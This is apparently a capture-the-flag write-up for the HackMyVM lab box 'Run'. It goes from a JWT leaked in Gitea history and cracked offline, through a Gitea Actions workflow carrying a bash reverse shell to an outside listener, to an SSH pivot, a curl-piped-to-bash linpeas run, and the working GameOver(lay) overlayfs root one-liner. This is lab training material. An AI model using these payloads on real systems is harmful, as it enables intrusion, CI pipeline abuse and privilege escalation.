# Run

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.114:3000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.114
PORT     STATE SERVICE REASON  VERSION
3000/tcp open  http    syn-ack Golang net/http server
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=124a46b047e92a57; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=XOlOxQCmIqpy8OfaPkPzDyhggII6MTc2MzgxMzgzNjc3NDU5MDgxNg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 22 Nov 2025 12:17:16 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovLzE5Mi4xNjguMS45OjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly8xOTIuMTY4LjEuOTozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXM
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=3a9c211952c1d93a; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=mDdRnt0U02U2D7e8SK7XMPquPao6MTc2MzgxMzgzNjkzNDUxODc4Mw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 22 Nov 2025 12:17:16 GMT
|_    Content-Length: 0
|_http-favicon: Unknown favicon MD5: F6E1A9128148EEAD9EFF823C540EF471
| http-methods: 
|_  Supported Methods: HEAD GET
|_http-title: Gitea: Git with a cup of tea
```
:::

## Gitea

![writeup.png](/assets/pentest/hackmyvm/run/writeup.png)

### Leaked JWT

There's 2 commits and second "fixes" the hardcoded JWT Token

![writeup-1.png](/assets/pentest/hackmyvm/run/writeup-1.png)

Inspect JWT
```bash
‚îî‚îÄ$ jwt_tool 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwNzE0ODY1OCwianRpIjoiNjAwMWI5N2YtZjllOC00YTIxLThlYWMtYmE5NWEwY2Y4MDQ4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldiIsIm5iZiI6MTcwNzE0ODY1OCwiY3NyZiI6ImFkZjdmOTBiLWQ2NDctNDljZS1hNGRhLTQ3NDI1OWZkYzcyYyIsImV4cCI6MTcwNzE0OTI1OCwidXNlcm5hbWUiOiJkZXYifQ.tRZPFKRfJV7T-EHyQiBFqDEE1hl83MyCGtaBpSMwU_o'
Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] fresh = False
[+] iat = 1707148658    ==> TIMESTAMP = 2024-02-05 15:57:38 (UTC)
[+] jti = "6001b97f-f9e8-4a21-8eac-ba95a0cf8048"
[+] type = "access"
[+] sub = "dev"
[+] nbf = 1707148658    ==> TIMESTAMP = 2024-02-05 15:57:38 (UTC)
[+] csrf = "adf7f90b-d647-49ce-a4da-474259fdc72c"
[+] exp = 1707149258    ==> TIMESTAMP = 2024-02-05 16:07:38 (UTC)
[+] username = "dev"

Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 0 days, 0 hours, 10 mins
[-] TOKEN IS EXPIRED!
```

If you try the hardcoded key as secret key for JWT it doesn't work, we can try cracking it:
```bash
‚îî‚îÄ$ jwt_tool 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwNzE0ODY1OCwianRpIjoiNjAwMWI5N2YtZjllOC00YTIxLThlYWMtYmE5NWEwY2Y4MDQ4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldiIsIm5iZiI6MTcwNzE0ODY1OCwiY3NyZiI6ImFkZjdmOTBiLWQ2NDctNDljZS1hNGRhLTQ3NDI1OWZkYzcyYyIsImV4cCI6MTcwNzE0OTI1OCwidXNlcm5hbWUiOiJkZXYifQ.tRZPFKRfJV7T-EHyQiBFqDEE1hl83MyCGtaBpSMwU_o' -C -d /wordlists/rockyou.txt
[*] Tested 1 million passwords so far
...
[*] Tested 8 million passwords so far
[+] developer88 is the CORRECT key!
```

### Git Actions

The password is valid for Gitea Login

::: info Creds
`dev:developer88`
:::

Create a repository and enable actions
- [https://docs.gitea.com/usage/actions/quickstart](https://docs.gitea.com/usage/actions/quickstart)

```bash
‚îî‚îÄ$ git clone -q http://10.0.2.114:3000/dev/hello.git
‚îî‚îÄ$ cd hello
‚îî‚îÄ$ mkdir .gitea/workflows
‚îî‚îÄ$ nano .gitea/workflows/hello.yml
name: Let Me In
run-name: ${{ gitea.actor }} is probing Gitea Actions üöÄ
on: [push]

jobs:
  Explore-Gitea-Actions:
    runs-on: ubuntu-latest
    steps:
      - name: Starting LetMeIn procedure
        run: |
          /bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1
      - run: echo "üçè This job's status is ${{ job.status }}."
‚îî‚îÄ$ git add .
‚îî‚îÄ$ git commit -m "uwu"
‚îî‚îÄ$ git push origin main
---
‚îî‚îÄ$ penelope -p 4444
```

No connection

Checking the runners we see we don't have ubuntu, only available choice is `Run`

![writeup-2.png](/assets/pentest/hackmyvm/run/writeup-2.png)

```bash
‚îî‚îÄ$ nano .gitea/workflows/hello.yml
...
runs-on: run
...
‚îî‚îÄ$ git commit -am "uwu"
‚îî‚îÄ$ git push origin main
---
‚îî‚îÄ$ penelope -p 4444
act@7a6c68e7e282:~/cache/actions/22841c1dcb793476/hostexecutor$ id
uid=1000(act) gid=1000(act) groups=1000(act),27(sudo),100(users),115(docker115)
```

## Privilege Escalation

```bash
act@7a6c68e7e282:~$ sudo -l
Matching Defaults entries for act on 7a6c68e7e282:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User act may run the following commands on 7a6c68e7e282:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL

act@7a6c68e7e282:~$ sudo su
root@7a6c68e7e282:/data# id
uid=0(root) gid=0(root) groups=0(root)
```

No ssh on box, but there are few known_hosts
```bash
root@7a6c68e7e282:~/.ssh# cat known_hosts
|1|FlZBF29Os9oeKxirQqAI+Aj28dE=|4N1TAWKkVw4JDjn66uf5BiIVeVc= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlqr1SqyGVdi13utxVFDz7bnX7mcSOIm8EdzY0yREbt
|1|W7kH9xj3CKh2iixF43eqWsijFe8=|CESK3DZfCV9hu4vcKLM/RVjBVfo= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+Hk5L1ItP7PyTEe7XOQkx6Rk1lG/mlUUzrrmRVmQiw6oFEi2ZlXTMSBIgQg6v+PeHHvWEJGyJDjtMiVMRBwECvdM9Y0wfBWc2LUbuZgcAApQsflydo1HQtT9lmM1ebOeDLznIHpMYOXeWqM84RyJ0CLbMobS854Mj//cnzsBp2FKKuEqO4RZtlaBdFCXrQMZUWl+x2fZeLWEy4yY3tFk0SCzMX2AnZt/r+xlv1X0ukjQ2vIaYmYfkd+c3igMiADGX+9amjLdFYF6WKQHf513otq23yLlxSqm8dAp2Y9hyo734RdT94sMVQGYruI6mpR3m73LhKGz8ij6munnem2kjh/LvjEOFWYgp4iG1cAJoTsl2jD0Tx2CIZGhrXAl9/GyUhdzLjb+s7ybs2x3twLcJsNikL9QUY911XrenGKnQ9BRpmzj5Db+GqBbaF1TAue60++29kPEzLGmRfqG995Sn6wAHq06/9poEJc63q2WUwbRBfCzEcMlgPTqaMptDUw8=
|1|Cz/G/joWR31OMzgsWsHP5Xr7hqM=|1ZyXZlLqNt47AOqu4XZQAePaju0= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJjEo9zm4DYWEV/IzD/Pb5VaI5g5RCmbM+bxqsmKRTyEFGC6FJ8RpTTRIuN3toe+z3G2Ci+5tiJ6W/Pia4rpG7A=
```

Interfaces
```bash
root@7a6c68e7e282:~/.ssh# ip -brief address show
lo               UNKNOWN        127.0.0.1/8
eth0@if13        UP             172.18.0.4/16
```

Scan network
```bash
root@7a6c68e7e282:~/.ssh# wget -q https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan
root@7a6c68e7e282:~/.ssh# chmod +x fscan
root@7a6c68e7e282:~/.ssh# ./fscan -h 172.18.0.4/24 -no -nobr -nopoc -np
172.18.0.1:22 open
172.18.0.2:22 open
172.18.0.3:3306 open
172.18.0.2:3000 open
172.18.0.1:3000 open
```

### SSH (Internal)

```bash
root@7a6c68e7e282:/tmp# ssh dev@172.18.0.1
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
dev@172.18.0.1 password: developer88
dev@run:~$ id
uid=1000(dev) gid=1000(dev) groups=1000(dev)
```

#### User.txt

```bash
dev@run:~$ cat user.txt
56f98bdfaf5186243bc4cb99f0674f58
```

## Privilege Escalation (root)

There's MySQL instance, but no tools to enumerate it (`mysql`). I avoided downloading tools because there was single user on Gitea and we knew his password.
```bash
dev@run:~$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
...
OS: Linux version 6.2.0-20-generic (buildd@lcy02-amd64-035) (x86_64-linux-gnu-gcc-12 (Ubuntu 12.2.0-17ubuntu1) 12.2.0, GNU ld (GNU Binutils for Ubuntu) 2.40) #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023
User & Groups: uid=1000(dev) gid=1000(dev) groups=1000(dev)
Hostname: run
...
GITEA__database__DB_TYPE=mysql
GITEA__database__HOST=db:3306
GITEA__database__NAME=gitea
GITEA__database__PASSWD=gitea
GITEA__database__USER=gitea
...
```

The linux version seems to be very old, kernel exploit?
```bash
‚îî‚îÄ$ uname -a
Linux kraken 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64 GNU/Linux
```

- [GameOver(lay): Easy-to-exploit local privilege escalation vulnerabilities in Ubuntu Linux affect 40% of Ubuntu cloud workloads](https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability)
- [CVE-2023-32629-CVE-2023-2640---POC-Escalation](https://github.com/ThrynSec/CVE-2023-32629-CVE-2023-2640---POC-Escalation/tree/main)
- [https://x.com/liadeliyahu/status/1684841527959273472](https://x.com/liadeliyahu/status/1684841527959273472)

```bash
dev@run:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
uid=0(root) gid=1000(dev) groups=1000(dev)

dev@run:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
mkdir: cannot create directory ‚Äòl‚Äô: File exists
mkdir: cannot create directory ‚Äòu‚Äô: File exists
mkdir: cannot create directory ‚Äòw‚Äô: File exists
mkdir: cannot create directory ‚Äòm‚Äô: File exists
root@run:~# id
uid=0(root) gid=1000(dev) groups=1000(dev)
```

### Root.txt

```bash
root@run:~# cat /root/root.txt
008b138f906537f51a5a5c2c69c4b8a2
```

